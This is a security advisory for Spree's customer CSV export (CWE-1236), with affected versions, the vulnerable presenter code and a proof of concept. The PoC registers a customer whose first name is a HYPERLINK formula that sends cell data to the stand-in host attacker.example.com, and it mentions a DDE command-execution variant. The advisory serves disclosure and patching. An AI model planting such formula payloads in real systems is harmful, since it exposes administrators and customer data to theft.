# [M] Spree: CSV Formula Injection in Customer Export

## Summary
Severity: Medium
Advisory: GHSA-xf4v-w5x5-pv79
CWE: CWE-1236
Ecosystem: RubyGems
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-06-04
Source: https://github.com/advisories/GHSA-xf4v-w5x5-pv79
Type: github-advisory

## Affected
- RubyGems: `spree` — affected >=5.2.0 <5.2.8
- RubyGems: `spree` — affected >=5.3.0 <5.3.6
- RubyGems: `spree` — affected >=5.4.0 <5.4.3

## Details
### Summary

CSV formula injection (also known as formula injection or CSV injection) affects customer export. User-controlled values customer names, email addresses, and shipping addresses. When an administrator opens a crafted
Export in Microsoft Excel or LibreOffice Calc, formulas embedded in user data execute in the
context of the administrator's desktop, potentially exfiltrating data or executing OS commands
via DDE (Dynamic Data Exchange).

---

### Details

#### Affected presenters and fields

| Presenter | Path | User-controlled fields |
|---|---|---|
| `CustomerPresenter` | `spree/core/app/presenters/spree/csv/customer_presenter.rb:36` | `first_name`, `last_name`, `address1`, `address2`, `city`, `phone` |

#### Vulnerable code — `customer_presenter.rb` (representative example)

```ruby
# spree/core/app/presenters/spree/csv/customer_presenter.rb:36–53
def call
  csv = [
    customer.first_name,          # ← written verbatim; may contain =HYPERLINK(...)
    customer.last_name,           # ← user-controlled
    customer.email,              
    customer.accepts_email_marketing ? Spree.t(:say_yes) : Spree.t(:say_no),
    customer.address&.company,    # ← user-controlled
    customer.address&.address1,   # ← user-controlled
    customer.address&.address2,   # ← user-controlled
    customer.address&.city,       # ← user-controlled
    customer.address&.state_text,
    customer.address&.state_abbr,
    customer.address&.country&.name,
    customer.address&.country&.iso,
    customer.address&.zipcode,
    customer.phone,               # ← user-controlled
    customer.amount_spent_in(Spree::Store.current.default_currency),
    customer.completed_orders.count,
  ]
  csv += metafields_for_csv(customer)
  csv
end
```

---

### PoC

**Precondition**: A Spree store with public customer registration enabled (default
configuration). No special permissions required for the attacker.

#### Step 1 — Register as a customer with an injected first name

```bash
curl -X POST https://store.example.com/api/v3/store/customers \
  -H "Content-Type: application/json" \
  -H "X-Spree-Api-Key: pk_<publishable_api_key>" \
  -d '{
    "email": "attacker@evil.com",
    "password": "password123",
    "password_confirmation": "password123",
    "first_name": "=HYPERLINK(\"http://attacker.example.com/exfil?d=\"&B1,\"Click\")",
    "last_name": "Smith"
  }'
```

#### Step 2 — Admin triggers a customer export

```bash
curl -X POST https://store.example.com/api/v3/admin/exports \
  -H "Authorization: Bearer <admin_jwt>" \
  -H "Content-Type: application/json" \
  -d '{"type": "Spree::Exports::Customers", "record_selection": "all"}'
```

#### Step 3 — Admin polls until ready, then downloads

```bash
# Poll for completion
curl https://store.example.com/api/v3/admin/exports/<export_id> \
  -H "Authorization: Bearer <admin_jwt>"

# Download
curl https://store.example.com/api/v3/admin/exports/<export_id>/download \
  -H "Authorization: Bearer <admin_jwt>" \
  -o customers.csv
```

#### Step 4 — Verify injection in the raw CSV (without opening in Excel)

Open `customers.csv` in a text editor. The first data row will contain:

```
"=HYPERLINK(""http://attacker.example.com/exfil?d=""&B1,""Click"")","Smith","attacker@evil.com",...
```

#### Step 5 — Admin opens `customers.csv` in Microsoft Excel (Windows)

- Excel warns about external data connections; if the administrator clicks **Enable**, the
  `HYPERLINK` formula fires and sends a GET request to `http://attacker.example.com/exfil?d=<B1_value>`.
- Cell B1 in the customers export is the **Last Name** column. Adjacent columns contain
  email, address, and order total data for all exported customers.
- With the DDE variant (`=CMD|...`) on older or unpatched Excel versions, a subprocess
  is launched on the administrator's machine.

---

### Impact

**Vulnerability class**: CSV / Formula Injection (CWE-1236)

#### Who is impacted

- **Administrators** who download and open export files in spreadsheet software are the
  direct victims. Administrative accounts have access to all store data, payment method
  configurations, customer PII, and full order history.

#### Realistic attack chain

| Step | Actor | Action | Privilege required |
|---|---|---|---|
| 1 | Attacker | Registers as customer | Public registration |
| 2 | Attacker | Sets `first_name` to formula payload | None beyond registration |
| 3 | Admin | Runs a routine weekly/monthly export | Normal operational task |
| 4 | Admin | Opens CSV in Excel | None |
| 5 | Attacker | Receives exfiltrated spreadsheet data | Passive |

#### Data at risk

All data visible to the administrator in the spreadsheet at the time of opening, including:

- All exported customer emails, names, addresses, phone numbers
- Order totals and purchase history
- Any other columns in the same export file

## References
- https://github.com/spree/spree/security/advisories/GHSA-xf4v-w5x5-pv79
- https://github.com/spree/spree
- https://github.com/spree/spree/releases/tag/v5.2.8
- https://github.com/spree/spree/releases/tag/v5.3.6
- https://github.com/spree/spree/releases/tag/v5.4.3
